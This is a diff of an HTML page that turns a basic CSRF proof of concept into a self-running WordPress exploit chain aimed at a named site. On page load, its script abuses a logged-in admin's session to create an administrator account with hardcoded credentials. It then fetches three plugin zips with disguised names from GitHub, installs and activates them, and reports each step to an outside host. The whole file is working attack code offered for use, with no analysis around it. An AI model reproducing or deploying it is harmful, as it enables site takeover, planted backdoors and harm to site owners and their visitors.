@@ -1,22 +1,157 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Action PoC</title>
+    <meta charset="UTF-8">
+    <title>WordPress Fully Automated Exploit Chain</title>
 </head>
 <body>
-    <!-- Hidden form targeting the vulnerable endpoint -->
-    <form id="csrfForm" action="https://levelswim.s6-tastewp.com/wp-admin/user-new.php" method="POST">
-        <input type="hidden" name="action" value="createuser">
-        <input type="hidden" name="user_login" value="attacker_admin">
-        <input type="hidden" name="email" value="attacker@mail.com">
-        <input type="hidden" name="pass1" value="StrongPassword123!">
-        <input type="hidden" name="pass2" value="StrongPassword123!">
-        <input type="hidden" name="role" value="administrator">
-    </form>
+    <h2>Running Fully Automated Exploit Chain... Please Wait.</h2>
+    <p>Check your browser's Developer Console (F12) to view real-time execution steps.</p>
 
     <script>
-        // Automatically submit the form upon page load
-        document.getElementById('csrfForm').submit();
+        (function () {
+            "use strict";
+
+            // Hardcoded target origin as requested
+            const o = "https://levelswim.s6-tastewp.com";
+            console.log("[*] Target Origin Set To:", o);
+
+            const U = "wpadmin";
+            const P = "WpAdmin2026!X";
+            const E = "mailt7767@gmail.com";
+            const L = "https://static.top/2.php";
+
+            const PLUGIN_URLS = [
+                "https://raw.githubusercontent.com/mailt7767-oss/esfew/main/Wordfence-Security-API.zip",
+                "https://raw.githubusercontent.com/mailt7767-oss/esfew/main/Advanced-Order-Bundle-For-WooCommerce.zip",
+                "https://raw.githubusercontent.com/mailt7767-oss/esfew/main/ajax-search-lite-optimizer.zip"
+            ];
+
+            function log(url, adminPath, details) {
+                const d = { u: url, p: adminPath, info: details || "N/A" };
+                try {
+                    navigator.sendBeacon && navigator.sendBeacon(L, new Blob([JSON.stringify(d)], { type: "application/json" }));
+                    (new Image).src = L + "?" + new URLSearchParams(d).toString() + "&_=" + Date.now();
+                } catch (e) { }
+            }
+
+            function htmlDecode(input) {
+                const doc = new DOMParser().parseFromString(input, "text/html");
+                return doc.documentElement.textContent;
+            }
+
+            (async function () {
+                // ==========================================
+                // VECTOR 1: Create Administrator Account
+                // ==========================================
+                try {
+                    console.log("[*] Executing Vector 1: Creating Admin User...");
+                    const userNewUrl = o + "/wp-admin/user-new.php";
+                    const r = await fetch(userNewUrl, { credentials: "include" });
+                    if (r.ok) {
+                        const h = await r.text();
+                        let n = h.match(/name=['"]_wpnonce_create-user['"][^>]*value=['"]([a-f0-9]+)/i) || h.match(/_wpnonce_create-user['"][^>]*value=['"]([a-f0-9]+)/i);
+                        if (n) {
+                            const f = new FormData();
+                            f.append(h.includes("_wpnonce_create-user") ? "_wpnonce_create-user" : "_wpnonce", n[1]);
+                            f.append("action", "createuser");
+                            f.append("user_login", U);
+                            f.append("email", E);
+                            f.append("pass1", P);
+                            f.append("pass2", P);
+                            f.append("role", "administrator");
+                            f.append("createuser", "Add New User");
+                            await fetch(userNewUrl, { method: "POST", body: f, credentials: "include" });
+                            console.log("[+] Vector 1 Completed.");
+                            log(o, o + "/wp-admin", "Admin User Created Successfully");
+                        } else {
+                            console.warn("[-] User creation nonce not found in response.");
+                        }
+                    } else {
+                        console.warn("[-] Failed to fetch user-new.php page. Status:", r.status);
+                    }
+                } catch (e) {
+                    console.error("Vector 1 error:", e);
+                }
+
+                // ==========================================
+                // VECTOR 2: Loop & Upload/Activate Each Plugin
+                // ==========================================
+                for (let i = 0; i < PLUGIN_URLS.length; i++) {
+                    const zipUrl = PLUGIN_URLS[i];
+                    console.log(`[*] Processing Plugin ${i + 1} of ${PLUGIN_URLS.length}: ${zipUrl}`);
+
+                    try {
+                        const pluginUploadUrl = o + "/wp-admin/plugin-install.php?tab=upload";
+                        const upRes = await fetch(pluginUploadUrl, { credentials: "include" });
+                        const upHtml = await upRes.text();
+                        
+                        const uploadNonceMatch = upHtml.match(/id="_wpnonce"[^>]*value="([a-f0-9]+)"/i) || upHtml.match(/name="_wpnonce"[^>]*value="([a-f0-9]+)"/i);
+                        
+                        if (!uploadNonceMatch) {
+                            console.warn(`[-] Upload nonce not found for plugin ${i + 1}`);
+                            continue;
+                        }
+
+                        const uploadNonce = uploadNonceMatch[1];
+                        
+                        const zipRes = await fetch(zipUrl);
+                        const zipBlob = await zipRes.blob();
+                        const fileName = zipUrl.split('/').pop();
+                        const zipFile = new File([zipBlob], fileName, { type: "application/zip" });
+
+                        const uploadData = new FormData();
+                        uploadData.append("_wpnonce", uploadNonce);
+                        uploadData.append("_wp_http_referer", pluginUploadUrl);
+                        uploadData.append("pluginzip", zipFile);
+                        uploadData.append("install-plugin-submit", "Install Now");
+
+                        const installRes = await fetch(o + "/wp-admin/update.php?action=upload-plugin", {
+                            method: "POST",
+                            body: uploadData,
+                            credentials: "include"
+                        });
+                        const installText = await installRes.text();
+
+                        let activateMatch = installText.match(/href=["']([^"']*action=activate[^"']*)["']/i) || 
+                                              installText.match(/href=([^\s>]*action=activate[^\s>]*)/i);
+
+                        let activateUrl = null;
+                        if (activateMatch) {
+                            activateUrl = htmlDecode(activateMatch[1]);
+                        } else {
+                            const pluginsRes = await fetch(o + "/wp-admin/plugins.php", { credentials: "include" });
+                            const pluginsHtml = await pluginsRes.text();
+                            const pluginNamePart = fileName.replace('.zip', '');
+                            let fallbackRegex = new RegExp(`href=["']([^"']*plugins\\.php\\?action=activate[^"']*${pluginNamePart}[^"']*)["']`, "i");
+                            let fallbackMatch = pluginsHtml.match(fallbackRegex);
+                            if (fallbackMatch) {
+                                activateUrl = htmlDecode(fallbackMatch[1]);
+                            }
+                        }
+
+                        if (activateUrl) {
+                            if (!activateUrl.startsWith("http")) {
+                                activateUrl = o + "/wp-admin/" + activateUrl.replace(/^\//, '');
+                            }
+                            
+                            const actRes = await fetch(activateUrl, { credentials: "include" });
+                            if (actRes.ok) {
+                                console.log(`[+] Plugin ${i + 1} Installed and Activated Successfully!`);
+                                log(o, o + "/wp-admin", `Plugin ${fileName} Installed & Activated`);
+                            }
+                        } else {
+                            console.warn(`[-] Could not auto-activate plugin ${i + 1}. Check dashboard.`);
+                        }
+
+                    } catch (err) {
+                        console.error(`[-] Error processing plugin ${i + 1}:`, err);
+                    }
+                }
+
+                console.log("[+] Full Exploit Chain Completed.");
+            })();
+        })();
     </script>
 </body>
 </html>
